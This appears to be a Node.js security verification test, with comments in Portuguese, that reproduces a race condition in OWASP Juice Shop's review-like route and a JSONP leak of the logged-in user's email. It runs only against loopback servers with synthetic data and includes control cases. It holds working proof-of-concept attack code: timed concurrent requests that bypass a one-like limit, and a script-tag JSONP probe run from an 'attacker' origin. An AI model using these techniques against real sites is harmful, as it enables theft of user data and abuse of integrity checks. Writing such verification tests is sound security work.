/** Rotas reais, MarsDB/Express/Chromium reais; identidade de sessao simulada.
 * Somente listeners loopback e dados sinteticos. Nao altera o alvo.
 */
import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import { execFileSync } from 'node:child_process'
import { createRequire, stripTypeScriptTypes } from 'node:module'
import { once } from 'node:events'
import path from 'node:path'
import { test } from 'node:test'
const wt = process.env.JUICE_SHOP_WORKTREE, deps = process.env.ROUND11_DEPS
assert.ok(wt && deps)
const require = createRequire(path.join(deps, 'package.json'))
const meta = JSON.parse(readFileSync(new URL('../../../outputs/sast_antes/catalogo_meta.json', import.meta.url)))
assert.equal(execFileSync('git', ['rev-parse', 'HEAD'], { cwd: wt, encoding: 'utf8' }).trim(), meta.commit_alvo)
assert.equal(execFileSync('git', ['status', '--porcelain'], { cwd: wt, encoding: 'utf8' }).trim(), '')
for (const [name, version] of Object.entries({ marsdb: '0.6.11', express: '4.22.1', 'cookie-parser': '1.4.7', playwright: '1.41.2' })) assert.equal(require(`${name}/package.json`).version, version)
const read = file => readFileSync(path.join(wt, file), 'utf8')
function evaluate(source, result, deps) {
  const js = stripTypeScriptTypes(source).replace(/^import[\s\S]*?from ['"][^'"]+['"];?\s*$/gm, '').replace(/^export /gm, '')
  return new Function(...Object.keys(deps), `${js}\nreturn (${result});`)(...Object.values(deps))
}
const challengeUtils = { solveIf() {} }, challenges = new Proxy({}, { get: (_, key) => key })
const identity = { data: { id: 1, email: 'victim@example.test' } }
const { Collection } = require('marsdb')
const reviews = new Collection('round11-local-test')
const handler = evaluate(read('routes/likeProductReviews.ts'), 'likeProductReviews()', {
  challengeUtils, challenges, security: { authenticatedUsers: { from: () => identity } }, db: { reviewsCollection: reviews }
})
const invoke = id => new Promise((resolve, reject) => {
  const res = { code: 200, status(code) { this.code = code; return this }, json(value) { resolve({ status: this.code, value }) } }
  handler({ body: { id } }, res, reject).catch(reject)
})
test('rota real: curtidas concorrentes excedem uma; sequencial rejeita repeticao', async () => {
  const sequential = await reviews.insert({ likesCount: 0, likedBy: [] })
  assert.equal((await invoke(sequential)).status, 200)
  assert.equal((await invoke(sequential)).status, 403)
  for (let attempt = 0; attempt < 3; attempt++) {
    const id = await reviews.insert({ likesCount: 0, likedBy: [] })
    // Iniciar cada requisicao depois do incremento anterior, mas antes do
    // registro de autoria (janela real de 150ms). Evita perda de incrementos
    // do MarsDB mascarar a corrida que queremos medir.
    const pending = []
    for (let count = 1; count <= 3; count++) {
      pending.push(invoke(id))
      const deadline = Date.now() + 100
      while ((await reviews.findOne({ _id: id })).likesCount !== count) {
        assert.ok(Date.now() < deadline, 'Incremento nao observado na janela')
        await new Promise(resolve => setImmediate(resolve))
      }
    }
    const responses = await Promise.all(pending)
    assert.ok(responses.every(r => r.status === 200))
    const stored = await reviews.findOne({ _id: id })
    assert.equal(stored.likesCount, 3)
    assert.equal(stored.likedBy.filter(email => email === identity.data.email).length, 3)
  }
})
test('controle: filtro de elegibilidade e incremento no mesmo update', async () => {
  const id = await reviews.insert({ likesCount: 0, likedBy: [] })
  const atomic = () => reviews.update({ _id: id, likedBy: { $ne: identity.data.email } }, { $inc: { likesCount: 1 }, $addToSet: { likedBy: identity.data.email } })
  await Promise.all([atomic(), atomic(), atomic()])
  const stored = await reviews.findOne({ _id: id })
  assert.equal(stored.likesCount, 1)
  assert.deepEqual(stored.likedBy, [identity.data.email])
})

test('JSONP no navegador: origem diferente mesmo site; controle cross-site e JSON', { timeout: 30000 }, async t => {
  const express = require('express')
  const route = evaluate(read('routes/currentUser.ts'), 'retrieveLoggedInUser()', {
    challenges, challengeUtils, security: { verify: token => token === 'synthetic-session', authenticatedUsers: { get: token => token === 'synthetic-session' ? identity : undefined } }
  })
  const app = express()
  app.use(require('cookie-parser')())
  // Mesmos defaults de res.cookie('token', token) em lib/insecurity.ts.
  app.get('/session', (req, res) => { res.cookie('token', 'synthetic-session'); res.send('session') })
  app.get('/whoami', route)
  app.get('/protected', (req, res) => { res.jsonp = value => res.json(value); route(req, res) })
  const victim = app.listen(0, '127.0.0.1')
  await once(victim, 'listening')
  t.after(() => new Promise(resolve => victim.close(resolve)))
  const victimURL = `http://victim.example.test:${victim.address().port}`
  const attackerApp = express()
  const attackerCookies = []
  attackerApp.get('/', (req, res) => { attackerCookies.push(req.headers.cookie); res.send('local attacker page') })
  const attacker = attackerApp.listen(0, '127.0.0.1')
  await once(attacker, 'listening')
  t.after(() => new Promise(resolve => attacker.close(resolve)))
  const browser = await require('playwright').chromium.launch({ headless: true,
    args: ['--host-resolver-rules=MAP *.test 127.0.0.1', '--no-proxy-server'] })
  t.after(() => browser.close())
  console.log(`Browser usado: ${browser.version()}`)
  const context = await browser.newContext()
  const page = await context.newPage()
  await page.goto(victimURL + '/session')
  const cookies = await context.cookies()
  assert.equal(cookies.find(c => c.name === 'token').sameSite, 'Lax')
  const probe = async (origin, endpoint) => {
    await page.goto(origin)
    return page.evaluate(url => new Promise(resolve => {
      window.capture = value => resolve(value)
      const script = document.createElement('script')
      script.src = url
      script.onload = () => resolve(null)
      script.onerror = () => resolve(null)
      document.body.appendChild(script)
    }), victimURL + endpoint + '?callback=capture')
  }
  const sameSite = `http://attacker.example.test:${attacker.address().port}`
  assert.notEqual(new URL(sameSite).origin, new URL(victimURL).origin)
  assert.equal((await probe(sameSite, '/whoami')).user.email, identity.data.email)
  assert.equal(await probe(sameSite, '/protected'), null)
  const crossSite = `http://other.invalid.test:${attacker.address().port}`
  const anonymous = await probe(crossSite, '/whoami')
  assert.ok(!anonymous?.user?.email, 'Cookie Lax nao deve acompanhar script cross-site')
  assert.ok(attackerCookies.every(cookie => !cookie), 'Host atacante nao pode receber cookie host-only da vitima')
})
